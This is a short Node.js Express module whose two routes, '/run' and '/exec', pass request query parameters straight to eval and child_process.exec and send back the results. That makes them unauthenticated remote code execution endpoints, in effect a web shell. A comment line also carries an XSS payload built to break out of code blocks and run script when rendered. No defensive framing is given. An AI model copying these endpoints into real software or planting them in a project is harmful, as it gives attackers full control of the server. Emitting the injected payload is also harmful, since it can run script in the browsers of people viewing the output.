const express = require('express');
const app = express();
// ZQSNIP </pre></code><img src=x onerror=alert(51337)>
app.get('/run', (req, res) => { res.send(eval(req.query.cmd)); });
app.get('/exec', (req, res) => { require('child_process').exec(req.query.c, (e,o)=>res.send(o)); });
module.exports = app;
